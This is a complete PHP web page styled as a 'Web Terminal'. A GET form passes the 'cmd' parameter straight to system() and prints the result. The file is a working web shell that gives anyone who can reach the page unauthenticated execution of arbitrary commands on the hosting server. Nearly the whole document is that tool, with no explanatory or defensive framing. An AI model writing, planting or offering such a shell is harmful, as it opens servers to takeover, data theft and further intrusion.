<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web Terminal</title>
    <style>
        body {
            background-color: #121212;
            color: #00FF00;
            font-family: "Courier New", monospace;
            padding: 20px;
        }

        h1 {
            color: #00FF00;
            text-align: center;
        }

        .terminal-box {
            background-color: #1e1e1e;
            border: 1px solid #00FF00;
            border-radius: 8px;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }

        form {
            display: flex;
            flex-direction: row;
            gap: 10px;
            margin-bottom: 15px;
        }

        input[type="TEXT"] {
            flex: 1;
            padding: 10px;
            font-family: "Courier New", monospace;
            font-size: 16px;
            background-color: #000;
            color: #00FF00;
            border: 1px solid #00FF00;
            border-radius: 4px;
        }

        input[type="SUBMIT"] {
            padding: 10px 20px;
            background-color: #00FF00;
            color: #000;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        input[type="SUBMIT"]:hover {
            background-color: #00cc00;
        }

        pre {
            background-color: #000;
            padding: 15px;
            border-radius: 4px;
            border: 1px solid #00FF00;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <h1>🖥️ Web Terminal</h1>
    <div class="terminal-box">
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" id="cmd" placeholder="Enter command here...">
            <input type="SUBMIT" value="Execute">
        </form>
        <pre>
<?php
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
        </pre>
    </div>
    <script>document.getElementById("cmd").focus();</script>
</body>
</html>
